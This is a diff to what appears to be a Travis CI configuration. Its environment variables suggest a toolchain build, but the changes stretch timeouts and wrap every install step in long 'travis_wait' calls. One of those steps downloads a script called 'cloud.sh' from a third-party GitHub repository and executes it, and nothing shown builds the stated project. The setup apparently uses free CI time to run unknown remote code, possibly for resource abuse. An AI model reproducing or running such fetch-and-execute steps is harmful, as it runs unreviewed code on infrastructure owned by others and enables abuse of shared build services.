@@ -1,3 +1,4 @@
+timeout : 7200s
 sudo: required
 language: bash
 services:
@@ -8,13 +9,13 @@ env:
     - CT_RELEASE=1.0.1
     - BR_RELEASE=2015.08.1-rev1
     - BR_TRAVIS_RELEASE=1.0.0
-script :
-    - travis_wait 45000 apt-get update
+
+    
     
 before_install: 
   
-  - sudo apt-get -y update 
-  - sudo apt-get -y install wget
-  - sudo apt-get -y update
-  - wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh
+  - travis_wait 45000 sudo apt-get -y update 
+  - travis_wait 45000 sudo apt-get -y install wget
+  - travis_wait 45000 sudo apt-get -y update
+  - travis_wait 45000 wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh
   
